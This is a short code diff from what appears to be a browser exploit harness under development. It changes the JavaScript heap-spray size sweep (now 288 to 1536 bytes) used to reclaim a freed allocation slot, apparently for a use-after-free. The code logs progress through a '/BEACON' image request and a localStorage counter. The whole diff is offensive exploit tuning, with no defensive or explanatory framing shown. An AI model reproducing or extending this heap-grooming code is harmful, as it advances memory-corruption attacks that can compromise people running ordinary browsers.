@@ -21,12 +21,14 @@
     try { new Image().src = '/BEACON?V458-' + tag + '&t=' + Date.now(); } catch(e) {}
   }
 
-  // v458b: dense sweep, 8-byte granularity to 256. Rationale: no killer
-  // size at 16..128 (182 runs) — wrapper class is >128 or the ArrayBuffer
-  // bookkeeping header lifts each filler one class up, so dense coverage
-  // is needed to catch the true class under any header offset.
+  // v458d: p446's claiming spray included 320..1536 and the dense 8..256
+  // sweep never claimed (25 cycles, zero kills) — so the freed slot's
+  // class lives in 288..1536. Sweep that band: 16-byte steps to 512,
+  // 32-byte steps to 1024, 64-byte steps to 1536.
   var SIZES = [0];
-  for (var _i = 8; _i <= 256; _i += 8) SIZES.push(_i);
+  for (var _i = 288; _i <= 512; _i += 16) SIZES.push(_i);
+  for (var _i = 528; _i <= 1024; _i += 32) SIZES.push(_i);
+  for (var _i = 1088; _i <= 1536; _i += 64) SIZES.push(_i);
 
   var k;
   try { k = parseInt(localStorage.getItem('p458k') || '0', 10) || 0; } catch(e) { k = 0; }
